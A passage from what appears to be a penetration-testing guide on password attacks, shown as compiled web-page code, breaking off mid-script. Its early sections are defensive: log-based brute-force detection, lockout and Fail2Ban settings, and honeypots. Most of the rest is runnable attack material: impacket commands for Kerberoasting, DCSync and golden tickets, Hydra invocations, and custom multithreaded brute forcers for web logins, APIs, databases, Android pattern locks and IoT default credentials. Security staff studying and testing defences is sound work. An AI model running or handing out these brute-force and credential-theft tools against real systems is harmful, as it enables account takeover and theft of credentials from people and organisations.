len(recent_attempts),\r\n                    'users': list(set([a[0] for a in recent_attempts])),\r\n                    'timespan': time_window\r\n                })\r\n    \r\n    return alerts\r\n\r\ndef extract_timestamp(log_line):\r\n    # Simplified timestamp extraction\r\n    return datetime.now()  # Implement proper timestamp parsing\r\n\r\nif __name__ == \"__main__\":\r\n    import sys\r\n    if len(sys.argv) != 2:\r\n        print(\"Usage: python3 detect_bruteforce.py <log_file>\")\r\n        sys.exit(1)\r\n    \r\n    alerts = analyze_auth_logs(sys.argv[1])\r\n    for alert in alerts:\r\n        print(f\"ALERT: Brute force from {alert['ip']}\")\r\n        print(f\"  Attempts: {alert['attempts']}\")\r\n        print(f\"  Users: {', '.join(alert['users'])}\")\r\nEOF\r\n\r\n# Network monitoring for password attacks\r\n# Monitor failed authentication attempts\r\ntail -f /var/log/auth.log | grep \"Failed password\"\r\n\r\n# Monitor successful logins after failed attempts\r\ntail -f /var/log/auth.log | grep \"Accepted password\"\r\n\r\n# Detect password spraying\r\nawk '/Failed password/ {print $11}' /var/log/auth.log | sort | uniq -c | sort -nr\r\n\r\n# Monitor for unusual login times\r\nawk '/Accepted password/ {print $1, $2, $3, $9}' /var/log/auth.log | sort\n"})}),"\n",(0,s.jsx)(e.h3,{id:"92-defensive-countermeasures",children:"9.2 Defensive Countermeasures"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Account lockout policies\r\n# Windows\r\nnet accounts /lockoutthreshold:3 /lockoutduration:30 /lockoutwindow:30\r\n\r\n# Linux PAM configuration\r\ncat >> /etc/pam.d/common-auth << 'EOF'\r\nauth required pam_tally2.so deny=3 unlock_time=1800 even_deny_root\r\nEOF\r\n\r\n# Fail2Ban configuration for SSH\r\ncat > /etc/fail2ban/jail.local << 'EOF'\r\n[sshd]\r\nenabled = true\r\nport = ssh\r\nfilter = sshd\r\nlogpath = /var/log/auth.log\r\nmaxretry = 3\r\nbantime = 3600\r\nfindtime = 600\r\nEOF\r\n\r\n# Rate limiting with iptables\r\niptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set\r\niptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP\r\n\r\n# Strong password policies\r\ncat > password_policy.py << 'EOF'\r\n#!/usr/bin/env python3\r\nimport re\r\nimport string\r\n\r\ndef check_password_strength(password):\r\n    score = 0\r\n    feedback = []\r\n    \r\n    # Length check\r\n    if len(password) >= 12:\r\n        score += 2\r\n    elif len(password) >= 8:\r\n        score += 1\r\n    else:\r\n        feedback.append(\"Password should be at least 8 characters long\")\r\n    \r\n    # Character diversity\r\n    if re.search(r'[a-z]', password):\r\n        score += 1\r\n    else:\r\n        feedback.append(\"Add lowercase letters\")\r\n    \r\n    if re.search(r'[A-Z]', password):\r\n        score += 1\r\n    else:\r\n        feedback.append(\"Add uppercase letters\")\r\n    \r\n    if re.search(r'\\d', password):\r\n        score += 1\r\n    else:\r\n        feedback.append(\"Add numbers\")\r\n    \r\n    if re.search(r'[!@#$%^&*(),.?\":{}|<>]', password):\r\n        score += 1\r\n    else:\r\n        feedback.append(\"Add special characters\")\r\n    \r\n    # Common patterns\r\n    common_patterns = [\r\n        r'123+', r'abc+', r'qwerty', r'password', r'admin',\r\n        r'(.)\\1{2,}', r'(012|123|234|345|456|567|678|789)'\r\n    ]\r\n    \r\n    for pattern in common_patterns:\r\n        if re.search(pattern, password, re.IGNORECASE):\r\n            score -= 1\r\n            feedback.append(f\"Avoid common patterns\")\r\n            break\r\n    \r\n    # Strength classification\r\n    if score >= 6:\r\n        strength = \"Strong\"\r\n    elif score >= 4:\r\n        strength = \"Medium\"\r\n    else:\r\n        strength = \"Weak\"\r\n    \r\n    return {\r\n        'strength': strength,\r\n        'score': score,\r\n        'feedback': feedback\r\n    }\r\n\r\nif __name__ == \"__main__\":\r\n    password = input(\"Enter password to check: \")\r\n    result = check_password_strength(password)\r\n    print(f\"Strength: {result['strength']} (Score: {result['score']}/7)\")\r\n    if result['feedback']:\r\n        print(\"Suggestions:\")\r\n        for suggestion in result['feedback']:\r\n            print(f\"  - {suggestion}\")\r\nEOF\r\n\r\n# Multi-factor authentication setup\r\n# Google Authenticator PAM module\r\napt-get install libpam-google-authenticator\r\n\r\n# Configure 2FA for SSH\r\necho \"auth required pam_google_authenticator.so\" >> /etc/pam.d/sshd\r\nsed -i 's/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config\n"})}),"\n",(0,s.jsx)(e.h3,{id:"93-honeypot-and-deception-technologies",children:"9.3 Honeypot and Deception Technologies"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# SSH honeypot setup\r\ngit clone https://github.com/cowrie/cowrie.git\r\ncd cowrie\r\npython -m venv cowrie-env\r\nsource cowrie-env/bin/activate\r\npip install -r requirements.txt\r\n\r\n# Kippo honeypot for credential collection\r\ngit clone https://github.com/desaster/kippo.git\r\ncd kippo\r\npython kippo.py\r\n\r\n# Web application honeypot\r\ncat > web_honeypot.py << 'EOF'\r\n#!/usr/bin/env python3\r\nfrom flask import Flask, request, render_template_string\r\nimport logging\r\nfrom datetime import datetime\r\n\r\napp = Flask(__name__)\r\n\r\n# Setup logging\r\nlogging.basicConfig(\r\n    filename='honeypot.log',\r\n    level=logging.INFO,\r\n    format='%(asctime)s - %(message)s'\r\n)\r\n\r\nlogin_template = '''\r\n<!DOCTYPE html>\r\n<html>\r\n<head><title>Admin Login</title></head>\r\n<body>\r\n    <h2>Administrator Login</h2>\r\n    <form method=\"post\">\r\n        <p>Username: <input type=\"text\" name=\"username\" required></p>\r\n        <p>Password: <input type=\"password\" name=\"password\" required></p>\r\n        <p><input type=\"submit\" value=\"Login\"></p>\r\n    </form>\r\n</body>\r\n</html>\r\n'''\r\n\r\n@app.route('/', methods=['GET', 'POST'])\r\n@app.route('/admin', methods=['GET', 'POST'])\r\n@app.route('/login', methods=['GET', 'POST'])\r\ndef login():\r\n    if request.method == 'POST':\r\n        username = request.form.get('username')\r\n        password = request.form.get('password')\r\n        ip = request.remote_addr\r\n        \r\n        # Log the attempt\r\n        logging.info(f\"Login attempt from {ip}: {username}:{password}\")\r\n        \r\n        # Always return login failed\r\n        return \"Login failed. Please try again.\"\r\n    \r\n    return render_template_string(login_template)\r\n\r\nif __name__ == '__main__':\r\n    app.run(host='0.0.0.0', port=80)\r\nEOF\r\n\r\n# Database honeypot\r\ncat > db_honeypot.py << 'EOF'\r\n#!/usr/bin/env python3\r\nimport socket\r\nimport threading\r\nimport logging\r\n\r\nlogging.basicConfig(\r\n    filename='db_honeypot.log',\r\n    level=logging.INFO,\r\n    format='%(asctime)s - %(message)s'\r\n)\r\n\r\ndef handle_mysql_connection(conn, addr):\r\n    try:\r\n        # MySQL handshake simulation\r\n        conn.recv(1024)  # Receive client hello\r\n        \r\n        # Send server greeting\r\n        greeting = b'\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x37\\x2e\\x33\\x34\\x2d\\x6c\\x6f\\x67'\r\n        conn.send(greeting)\r\n        \r\n        # Receive auth attempt\r\n        auth_data = conn.recv(1024)\r\n        logging.info(f\"MySQL auth attempt from {addr}: {auth_data.hex()}\")\r\n        \r\n        # Send auth failed\r\n        conn.send(b'\\x07\\x00\\x00\\x02\\xff\\x15\\x04\\x23\\x32\\x38\\x30\\x30\\x30')\r\n        \r\n    except Exception as e:\r\n        logging.error(f\"Error handling connection from {addr}: {e}\")\r\n    finally:\r\n        conn.close()\r\n\r\ndef mysql_honeypot():\r\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    server.bind(('0.0.0.0', 3306))\r\n    server.listen(5)\r\n    \r\n    print(\"MySQL honeypot listening on port 3306\")\r\n    \r\n    while True:\r\n        conn, addr = server.accept()\r\n        thread = threading.Thread(target=handle_mysql_connection, args=(conn, addr))\r\n        thread.start()\r\n\r\nif __name__ == '__main__':\r\n    mysql_honeypot()\r\nEOF\n"})}),"\n",(0,s.jsx)(e.h2,{id:"10-specialized-attack-scenarios",children:"10. Specialized Attack Scenarios"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"These specialized scenarios require deep understanding of specific technologies and protocols. Always ensure proper authorization and follow ethical guidelines when testing these techniques."})}),"\n",(0,s.jsx)(e.h3,{id:"101-active-directory-credential-attacks",children:"10.1 Active Directory Credential Attacks"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Kerberoasting attack\r\nGetUserSPNs.py domain.com/user:password -request -format hashcat -outputfile kerberoast_hashes.txt\r\n\r\n# ASREPRoasting attack\r\nGetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt\r\n\r\n# DCSync attack\r\nsecretsdump.py domain.com/user:password@dc.domain.com -just-dc\r\n\r\n# NTDS.dit extraction\r\nsecretsdump.py -ntds ntds.dit -system system.hive LOCAL\r\n\r\n# Golden ticket attack preparation\r\nticketer.py -nthash krbtgt_hash -domain-sid domain_sid -domain domain.com administrator\r\n\r\n# Credential spraying against AD\r\ncrackmapexec smb targets.txt -u users.txt -p \'Password123\' --continue-on-success\r\n\r\n# LDAP authentication testing\r\nldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -W -b "dc=domain,dc=com"\r\n\r\n# Advanced Kerberos attacks\r\ncat > kerberos_attacks.py << \'EOF\'\r\n#!/usr/bin/env python3\r\nimport subprocess\r\nimport sys\r\nfrom datetime import datetime\r\n\r\ndef kerberoast_attack(domain, username, password, output_file):\r\n    """Perform Kerberoasting attack"""\r\n    cmd = [\r\n        \'GetUserSPNs.py\',\r\n        f\'{domain}/{username}:{password}\',\r\n        \'-request\',\r\n        \'-format\', \'hashcat\',\r\n        \'-outputfile\', output_file\r\n    ]\r\n    \r\n    try:\r\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\r\n        if result.returncode == 0:\r\n            print(f"Kerberoasting successful. Hashes saved to {output_file}")\r\n            return True\r\n        else:\r\n            print(f"Kerberoasting failed: {result.stderr}")\r\n            return False\r\n    except subprocess.TimeoutExpired:\r\n        print("Kerberoasting timed out")\r\n        return False\r\n\r\ndef asreproast_attack(domain, users_file, output_file):\r\n    """Perform ASREPRoasting attack"""\r\n    cmd = [\r\n        \'GetNPUsers.py\',\r\n        f\'{domain}/\',\r\n        \'-usersfile\', users_file,\r\n        \'-format\', \'hashcat\',\r\n        \'-outputfile\', output_file\r\n    ]\r\n    \r\n    try:\r\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\r\n        if result.returncode == 0:\r\n            print(f"ASREPRoasting successful. Hashes saved to {output_file}")\r\n            return True\r\n        else:\r\n            print(f"ASREPRoasting failed: {result.stderr}")\r\n            return False\r\n    except subprocess.TimeoutExpired:\r\n        print("ASREPRoasting timed out")\r\n        return False\r\n\r\ndef password_spray(targets_file, username, password):\r\n    """Perform password spraying against multiple targets"""\r\n    cmd = [\r\n        \'crackmapexec\', \'smb\',\r\n        targets_file,\r\n        \'-u\', username,\r\n        \'-p\', password,\r\n        \'--continue-on-success\'\r\n    ]\r\n    \r\n    try:\r\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)\r\n        print(result.stdout)\r\n        return result.returncode == 0\r\n    except subprocess.TimeoutExpired:\r\n        print("Password spraying timed out")\r\n        return False\r\n\r\nif __name__ == "__main__":\r\n    if len(sys.argv) < 2:\r\n        print("Usage: python3 kerberos_attacks.py <kerberoast|asrep|spray> [args...]")\r\n        sys.exit(1)\r\n    \r\n    attack_type = sys.argv[1]\r\n    \r\n    if attack_type == "kerberoast" and len(sys.argv) == 6:\r\n        domain, username, password, output = sys.argv[2:6]\r\n        kerberoast_attack(domain, username, password, output)\r\n    elif attack_type == "asrep" and len(sys.argv) == 5:\r\n        domain, users_file, output = sys.argv[2:5]\r\n        asreproast_attack(domain, users_file, output)\r\n    elif attack_type == "spray" and len(sys.argv) == 5:\r\n        targets, username, password = sys.argv[2:5]\r\n        password_spray(targets, username, password)\r\n    else:\r\n        print("Invalid arguments for attack type")\r\nEOF\n'})}),"\n",(0,s.jsx)(e.h3,{id:"102-web-application-password-attacks",children:"10.2 Web Application Password Attacks"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# HTTP form brute force with Hydra\r\nhydra -L users.txt -P passwords.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"\r\n\r\n# HTTPS form with cookies\r\nhydra -L users.txt -P passwords.txt target.com https-post-form "/login:user=^USER^&pass=^PASS^&csrf=token:Invalid login:H=Cookie: PHPSESSID=abc123"\r\n\r\n# WordPress brute force\r\nwpscan --url https://target.com --usernames admin,administrator --passwords passwords.txt\r\n\r\n# Custom web application brute forcer\r\ncat > web_bruteforce.py << \'EOF\'\r\n#!/usr/bin/env python3\r\nimport requests\r\nimport threading\r\nimport time\r\nfrom queue import Queue\r\nimport argparse\r\n\r\nclass WebBruteForcer:\r\n    def __init__(self, target_url, usernames, passwords, threads=10):\r\n        self.target_url = target_url\r\n        self.usernames = usernames\r\n        self.passwords = passwords\r\n        self.threads = threads\r\n        self.found_credentials = []\r\n        self.queue = Queue()\r\n        self.session = requests.Session()\r\n        \r\n        # Populate queue with credential combinations\r\n        for username in usernames:\r\n            for password in passwords:\r\n                self.queue.put((username, password))\r\n    \r\n    def attempt_login(self, username, password):\r\n        """Attempt login with given credentials"""\r\n        try:\r\n            # Get CSRF token if needed\r\n            resp = self.session.get(self.target_url)\r\n            \r\n            # Extract CSRF token (customize as needed)\r\n            csrf_token = self.extract_csrf_token(resp.text)\r\n            \r\n            # Prepare login data\r\n            login_data = {\r\n                \'username\': username,\r\n                \'password\': password,\r\n                \'csrf_token\': csrf_token  # Include if needed\r\n            }\r\n            \r\n            # Attempt login\r\n            resp = self.session.post(\r\n                self.target_url,\r\n                data=login_data,\r\n                timeout=10,\r\n                allow_redirects=False\r\n            )\r\n            \r\n            # Check for successful login indicators\r\n            if self.is_successful_login(resp):\r\n                print(f"[SUCCESS] {username}:{password}")\r\n                self.found_credentials.append((username, password))\r\n                return True\r\n            else:\r\n                print(f"[FAILED] {username}:{password}")\r\n                return False\r\n                \r\n        except Exception as e:\r\n            print(f"[ERROR] {username}:{password} - {str(e)}")\r\n            return False\r\n    \r\n    def extract_csrf_token(self, html):\r\n        """Extract CSRF token from HTML (customize as needed)"""\r\n        import re\r\n        match = re.search(r\'name="csrf_token" value="([^"]+)"\', html)\r\n        return match.group(1) if match else None\r\n    \r\n    def is_successful_login(self, response):\r\n        """Determine if login was successful (customize as needed)"""\r\n        # Common indicators of successful login\r\n        success_indicators = [\r\n            \'dashboard\', \'welcome\', \'logout\', \'profile\'\r\n        ]\r\n        \r\n        failure_indicators = [\r\n            \'invalid\', \'incorrect\', \'failed\', \'error\', \'denied\'\r\n        ]\r\n        \r\n        # Check status code\r\n        if response.status_code == 302:  # Redirect often indicates success\r\n            return True\r\n        \r\n        # Check response content\r\n        content = response.text.lower()\r\n        \r\n        # Look for failure indicators first\r\n        for indicator in failure_indicators:\r\n            if indicator in content:\r\n                return False\r\n        \r\n        # Look for success indicators\r\n        for indicator in success_indicators:\r\n            if indicator in content:\r\n                return True\r\n        \r\n        return False\r\n    \r\n    def worker(self):\r\n        """Worker thread for brute force attempts"""\r\n        while not self.queue.empty():\r\n            try:\r\n                username, password = self.queue.get(timeout=1)\r\n                self.attempt_login(username, password)\r\n                time.sleep(0.1)  # Rate limiting\r\n                self.queue.task_done()\r\n            except:\r\n                break\r\n    \r\n    def start_attack(self):\r\n        """Start the brute force attack"""\r\n        print(f"Starting brute force attack against {self.target_url}")\r\n        print(f"Usernames: {len(self.usernames)}, Passwords: {len(self.passwords)}")\r\n        print(f"Total combinations: {len(self.usernames) * len(self.passwords)}")\r\n        \r\n        # Start worker threads\r\n        threads = []\r\n        for i in range(self.threads):\r\n            t = threading.Thread(target=self.worker)\r\n            t.daemon = True\r\n            t.start()\r\n            threads.append(t)\r\n        \r\n        # Wait for completion\r\n        self.queue.join()\r\n        \r\n        print(f"\\nAttack completed. Found {len(self.found_credentials)} valid credentials:")\r\n        for username, password in self.found_credentials:\r\n            print(f"  {username}:{password}")\r\n\r\ndef load_wordlist(filename):\r\n    """Load wordlist from file"""\r\n    try:\r\n        with open(filename, \'r\', encoding=\'utf-8\', errors=\'ignore\') as f:\r\n            return [line.strip() for line in f if line.strip()]\r\n    except FileNotFoundError:\r\n        print(f"Error: File {filename} not found")\r\n        return []\r\n\r\nif __name__ == "__main__":\r\n    parser = argparse.ArgumentParser(description=\'Web Application Brute Forcer\')\r\n    parser.add_argument(\'url\', help=\'Target URL\')\r\n    parser.add_argument(\'-u\', \'--usernames\', required=True, help=\'Username wordlist file\')\r\n    parser.add_argument(\'-p\', \'--passwords\', required=True, help=\'Password wordlist file\')\r\n    parser.add_argument(\'-t\', \'--threads\', type=int, default=10, help=\'Number of threads\')\r\n    \r\n    args = parser.parse_args()\r\n    \r\n    usernames = load_wordlist(args.usernames)\r\n    passwords = load_wordlist(args.passwords)\r\n    \r\n    if not usernames or not passwords:\r\n        print("Error: Could not load wordlists")\r\n        sys.exit(1)\r\n    \r\n    bruteforcer = WebBruteForcer(args.url, usernames, passwords, args.threads)\r\n    bruteforcer.start_attack()\r\nEOF\r\n\r\n# JSON API brute force\r\ncat > api_bruteforce.py << \'EOF\'\r\n#!/usr/bin/env python3\r\nimport requests\r\nimport json\r\nimport threading\r\nfrom queue import Queue\r\n\r\ndef api_login_attempt(url, username, password):\r\n    """Attempt API login"""\r\n    headers = {\r\n        \'Content-Type\': \'application/json\',\r\n        \'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\'\r\n    }\r\n    \r\n    data = {\r\n        \'username\': username,\r\n        \'password\': password\r\n    }\r\n    \r\n    try:\r\n        response = requests.post(\r\n            url,\r\n            json=data,\r\n            headers=headers,\r\n            timeout=10\r\n        )\r\n        \r\n        # Check for successful authentication\r\n        if response.status_code == 200:\r\n            resp_data = response.json()\r\n            if \'token\' in resp_data or \'access_token\' in resp_data:\r\n                print(f"[SUCCESS] {username}:{password}")\r\n                print(f"Response: {response.text}")\r\n                return True\r\n        \r\n        print(f"[FAILED] {username}:{password} - Status: {response.status_code}")\r\n        return False\r\n        \r\n    except Exception as e:\r\n        print(f"[ERROR] {username}:{password} - {str(e)}")\r\n        return False\r\n\r\n# Example usage\r\n# python3 api_bruteforce.py\r\nEOF\n'})}),"\n",(0,s.jsx)(e.h3,{id:"103-database-credential-attacks",children:"10.3 Database Credential Attacks"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# MySQL brute force\r\nhydra -L users.txt -P passwords.txt mysql://target_ip\r\n\r\n# PostgreSQL brute force\r\nhydra -L users.txt -P passwords.txt postgres://target_ip\r\n\r\n# MSSQL brute force\r\nhydra -L users.txt -P passwords.txt mssql://target_ip\r\n\r\n# MongoDB brute force\r\nnmap -p 27017 --script mongodb-brute --script-args userdb=users.txt,passdb=passwords.txt target_ip\r\n\r\n# Redis brute force\r\nnmap -p 6379 --script redis-brute --script-args passdb=passwords.txt target_ip\r\n\r\n# Custom database brute forcer\r\ncat > db_bruteforce.py << \'EOF\'\r\n#!/usr/bin/env python3\r\nimport pymysql\r\nimport psycopg2\r\nimport pymongo\r\nimport redis\r\nimport threading\r\nfrom queue import Queue\r\nimport sys\r\n\r\nclass DatabaseBruteForcer:\r\n    def __init__(self, target, port, db_type, usernames, passwords, threads=10):\r\n        self.target = target\r\n        self.port = port\r\n        self.db_type = db_type.lower()\r\n        self.usernames = usernames\r\n        self.passwords = passwords\r\n        self.threads = threads\r\n        self.found_credentials = []\r\n        self.queue = Queue()\r\n        \r\n        # Populate queue\r\n        for username in usernames:\r\n            for password in passwords:\r\n                self.queue.put((username, password))\r\n    \r\n    def test_mysql(self, username, password):\r\n        """Test MySQL connection"""\r\n        try:\r\n            connection = pymysql.connect(\r\n                host=self.target,\r\n                port=self.port,\r\n                user=username,\r\n                password=password,\r\n                connect_timeout=5\r\n            )\r\n            connection.close()\r\n            return True\r\n        except:\r\n            return False\r\n    \r\n    def test_postgresql(self, username, password):\r\n        """Test PostgreSQL connection"""\r\n        try:\r\n            connection = psycopg2.connect(\r\n                host=self.target,\r\n                port=self.port,\r\n                user=username,\r\n                password=password,\r\n                connect_timeout=5\r\n            )\r\n            connection.close()\r\n            return True\r\n        except:\r\n            return False\r\n    \r\n    def test_mongodb(self, username, password):\r\n        """Test MongoDB connection"""\r\n        try:\r\n            client = pymongo.MongoClient(\r\n                host=self.target,\r\n                port=self.port,\r\n                username=username,\r\n                password=password,\r\n                serverSelectionTimeoutMS=5000\r\n            )\r\n            client.server_info()\r\n            client.close()\r\n            return True\r\n        except:\r\n            return False\r\n    \r\n    def test_redis(self, username, password):\r\n        """Test Redis connection"""\r\n        try:\r\n            r = redis.Redis(\r\n                host=self.target,\r\n                port=self.port,\r\n                password=password,\r\n                socket_connect_timeout=5\r\n            )\r\n            r.ping()\r\n            return True\r\n        except:\r\n            return False\r\n    \r\n    def test_credentials(self, username, password):\r\n        """Test credentials based on database type"""\r\n        if self.db_type == \'mysql\':\r\n            return self.test_mysql(username, password)\r\n        elif self.db_type == \'postgresql\':\r\n            return self.test_postgresql(username, password)\r\n        elif self.db_type == \'mongodb\':\r\n            return self.test_mongodb(username, password)\r\n        elif self.db_type == \'redis\':\r\n            return self.test_redis(username, password)\r\n        else:\r\n            return False\r\n    \r\n    def worker(self):\r\n        """Worker thread"""\r\n        while not self.queue.empty():\r\n            try:\r\n                username, password = self.queue.get(timeout=1)\r\n                \r\n                if self.test_credentials(username, password):\r\n                    print(f"[SUCCESS] {self.db_type}://{username}:{password}@{self.target}:{self.port}")\r\n                    self.found_credentials.append((username, password))\r\n                else:\r\n                    print(f"[FAILED] {username}:{password}")\r\n                \r\n                self.queue.task_done()\r\n            except:\r\n                break\r\n    \r\n    def start_attack(self):\r\n        """Start brute force attack"""\r\n        print(f"Starting {self.db_type} brute force against {self.target}:{self.port}")\r\n        \r\n        threads = []\r\n        for i in range(self.threads):\r\n            t = threading.Thread(target=self.worker)\r\n            t.daemon = True\r\n            t.start()\r\n            threads.append(t)\r\n        \r\n        self.queue.join()\r\n        \r\n        print(f"Attack completed. Found {len(self.found_credentials)} valid credentials.")\r\n\r\nif __name__ == "__main__":\r\n    if len(sys.argv) != 7:\r\n        print("Usage: python3 db_bruteforce.py <target> <port> <type> <users_file> <passwords_file> <threads>")\r\n        print("Types: mysql, postgresql, mongodb, redis")\r\n        sys.exit(1)\r\n    \r\n    target, port, db_type, users_file, passwords_file, threads = sys.argv[1:7]\r\n    \r\n    with open(users_file, \'r\') as f:\r\n        usernames = [line.strip() for line in f if line.strip()]\r\n    \r\n    with open(passwords_file, \'r\') as f:\r\n        passwords = [line.strip() for line in f if line.strip()]\r\n    \r\n    bruteforcer = DatabaseBruteForcer(\r\n        target, int(port), db_type, usernames, passwords, int(threads)\r\n    )\r\n    bruteforcer.start_attack()\r\nEOF\n'})}),"\n",(0,s.jsx)(e.h2,{id:"11-mobile-and-iot-device-password-attacks",children:"11. Mobile and IoT Device Password Attacks"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"Mobile and IoT attacks require specific tools and techniques. Always ensure you have proper authorization and understand the legal implications of testing these devices."})}),"\n",(0,s.jsx)(e.h3,{id:"111-android-password-attacks",children:"11.1 Android Password Attacks"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# ADB brute force for Android devices\r\nadb devices\r\nadb shell input text \"1234\"  # PIN attempt\r\nadb shell input keyevent 66  # Enter key\r\n\r\n# Android pattern brute force script\r\ncat > android_pattern_crack.py << 'EOF'\r\n#!/usr/bin/env python3\r\nimport subprocess\r\nimport time\r\nimport itertools\r\n\r\ndef send_pattern(pattern):\r\n    \"\"\"Send pattern to Android device via ADB\"\"\"\r\n    # Pattern coordinates (approximate)\r\n    coords = {\r\n        1: (200, 400), 2: (400, 400), 3: (600, 400),\r\n        4: (200, 600), 5: (400, 600), 6: (600, 600),\r\n        7: (200, 800), 8: (400, 800), 9: (600, 800)\r\n    }\r\n    \r\n    # Start at first point\r\n    if pattern:\r\n        x, y = coords[pattern[0]]\r\n        subprocess.run(['adb', 'shell', 'input', 'touchscreen', 'swipe', \r\n                       str(x), str(y), str(x), str(y), '100'])\r\n        \r\n        # Draw pattern\r\n        for i in range(1, len(pattern)):\r\n            x, y = coords[pattern[i]]\r\n            subprocess.run(['adb', 'shell', 'input', 'touchscreen', 'swipe', \r\n                           str(coords[pattern[i-1]][0]), str(coords[pattern[i-1]][1]),\r\n                           str(x), str(y), '100'])\r\n        \r\n        time.sleep(1)\r\n\r\ndef generate_patterns(min_length=4, max_length=9):\r\n    \"\"\"Generate all possible patterns\"\"\"\r\n    patterns = []\r\n    for length in range(min_length, max_length + 1):\r\n        for pattern in itertools.permutations(range(1, 10), length):\r\n            patterns.append(pattern)\r\n    return patterns\r\n\r\n# Common patterns to try first\r\ncommon_patterns = [\r\n    [1, 2, 3, 6, 9],  # L shape\r\n    [1, 2, 3, 4, 5, 6, 7, 8, 9],  # Full pattern\r\n    [2, 4, 6, 8],  # Cross\r\n    [1, 5, 9],  # Diagonal\r\n    [3, 5, 7],  # Other diagonal\r\n]\r\n\r\nif __name__ == \"__main__\":\r\n    print(\"Testing common patterns first...\")\r\n    for pattern in common_patterns:\r\n        print(f\"Trying pattern: {pattern}\")\r\n        send_pattern(pattern)\r\n        time.sleep(2)  # Wait for unlock attempt\r\nEOF\r\n\r\n# APK password extraction\r\naapt dump badging app.apk | grep package\r\napktool d app.apk\r\ngrep -r \"password\\|secret\\|key\" app/\r\n\r\n# Android keystore attacks\r\nkeytool -list -v -keystore debug.keystore\n"})}),"\n",(0,s.jsx)(e.h3,{id:"112-ios-password-attacks",children:"11.2 iOS Password Attacks"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# iOS backup password attacks\r\n# Extract backup manifest\r\npython3 -c "\r\nimport plistlib\r\nwith open(\'Manifest.plist\', \'rb\') as f:\r\n    manifest = plistlib.load(f)\r\n    print(\'IsEncrypted:\', manifest.get(\'IsEncrypted\', False))\r\n"\r\n\r\n# Hashcat iOS backup cracking\r\n# First, extract hash from backup\r\npython3 ios_backup_extractor.py backup_folder > ios_hash.txt\r\nhashcat -m 14800 ios_hash.txt wordlist.txt\r\n\r\n# Custom iOS PIN brute force (jailbroken devices)\r\ncat > ios_pin_crack.py << \'EOF\'\r\n#!/usr/bin/env python3\r\nimport subprocess\r\nimport time\r\n\r\ndef try_pin(pin):\r\n    """Try PIN on jailbroken iOS device"""\r\n    # This would require custom iOS tools and root access\r\n    # Implementation depends on iOS version and jailbreak tools\r\n    pass\r\n\r\n# Common iOS PINs\r\ncommon_pins = [\r\n    "0000", "1234", "1111", "0001", "1212",\r\n    "7777", "1004", "2000", "4444", "2222",\r\n    "6969", "9999", "3333", "5555", "6666",\r\n    "1313", "8888", "4321", "2001", "1010"\r\n]\r\n\r\nfor pin in common_pins:\r\n    print(f"Trying PIN: {pin}")\r\n    try_pin(pin)\r\n    time.sleep(1)\r\nEOF\n'})}),"\n",(0,s.jsx)(e.h3,{id:"113-iot-device-password-attacks",children:"11.3 IoT Device Password Attacks"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Router default credential testing\r\ncat > router_defaults.txt << \'EOF\'\r\nadmin:admin\r\nadmin:password\r\nadmin:\r\nroot:admin\r\nadmin:1234\r\nadmin:pass\r\nuser:user\r\nguest:guest\r\nadmin:router\r\nadmin:admin123\r\nEOF\r\n\r\n# Test default credentials\r\nwhile IFS=\':\' read -r username password; do\r\n    curl -u "$username:$password" -s "http://target_ip/admin" && echo "Success: $username:$password"\r\ndone < router_defaults.txt\r\n\r\n# SNMP community string brute force\r\nonesixtyone -c common_communities.txt target_ip\r\n\r\n# UPnP device discovery and testing\r\nnmap -sU -p 1900 --script=upnp-info target_range\r\n\r\n# Custom IoT brute forcer\r\ncat > iot_bruteforce.py << \'EOF\'\r\n#!/usr/bin/env python3\r\nimport requests\r\nimport threading\r\nfrom queue import Queue\r\nimport time\r\n\r\nclass IoTBruteForcer:\r\n    def __init__(self, target, service_type, credentials, threads=5):\r\n        self.target = target\r\n        self.service_type = service_type\r\n        self.credentials = credentials\r\n        self.threads = threads\r\n        self.queue = Queue()\r\n        self.found_credentials = []\r\n        \r\n        # Populate queue\r\n        for username, password in credentials:\r\n            self.queue.put((username, password))\r\n    \r\n    def test_http_auth(self, username, password):\r\n        """Test HTTP basic authentication"""\r\n        try:\r\n            response = requests.get(\r\n                f"http://{self.target}/",\r\n                auth=(username, password),\r\n                timeout=5\r\n            )\r\n            \r\n            if response.status_code == 200:\r\n                return True\r\n            return False\r\n        except:\r\n            return False\r\n    \r\n    def test_telnet_auth(self, username, password):\r\n        """Test Telnet authentication"""\r\n        import telnetlib\r\n        try:\r\n            tn = telnetlib.Telnet(self.target, 23, timeout=5)\r\n            tn.read_until(b"login: ")\r\n            tn.write(username.encode(\'ascii\') + b"\\n")\r\n            tn.read_until(b"Password: ")\r\n            tn.write(password.encode(\'ascii\') + b"\\n")\r\n            \r\n            response = tn.read_some()\r\n            tn.close()\r\n            \r\n            # Check for successful login indicators\r\n            if b"$" in response or b"#" in response or b">" in response:\r\n                